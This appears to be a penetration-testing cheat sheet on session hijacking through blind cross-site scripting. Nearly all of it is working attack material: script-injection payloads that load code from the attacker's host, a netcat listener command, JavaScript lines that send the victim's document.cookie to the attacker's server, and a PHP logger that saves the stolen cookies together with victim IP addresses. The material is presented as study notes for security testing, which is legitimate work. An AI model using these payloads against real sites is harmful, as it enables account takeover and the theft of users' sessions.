
# Session Hijacking Process


## Injecting External Script

- We need to try each of the below payloads to find our which input field is vulnerable to XSS. This happens normally in **Blind XSS** where we don't have idea how our input is handled since we don't have access to certain pages. The application probably loads an external script so we can try the below payloads to find the correct format.

```html
<!-- choose any 1 of the external script format -->
<!-- some might work others might not -->
<script src="http://[OUR_IP]/"></script>
'><script src=http://[OUR_IP]></script>
"><script src=http://[OUR_IP]></script>
```

- Setup the listener first before setting the payload to accurately understand the input field.

```bash
nc -lnvp 80
```

**Tip: replace the IP with individual input field names to accurately understand which field is vulnerable to XSS.**

---
## Session Hijacking Payloads

```js
document.location='http://[OUR_IP]/index.php?c='+document.cookie;
```

```js
new Image().src='http://[OUR_IP]/index.php?c='+document.cookie;
```

We can write any one of the above 2 payloads in our external `script.js` file so that we can get the victim's cookie. So create a `script.js` file and store the any one of the above 2 payloads there.

---
## Setting up Listener

- Create the below directory and move to that location.

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
```

- Create `script.js` which will load the `index.php` when we add our external JavaScript `script.js` to get the cookie.
- The Session Hijacking Payloads inside the `script.js` are going to send the cookie value to `index.php` so we need to create that file first.
- Create the `index.php` file and paste the below code inside it.
- Provide the Victim IP.

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

- The `index.php` file will receive the cookie value in `c` parameter and store the cookie value inside the **cookies.txt** file along with the Victim's IP address.
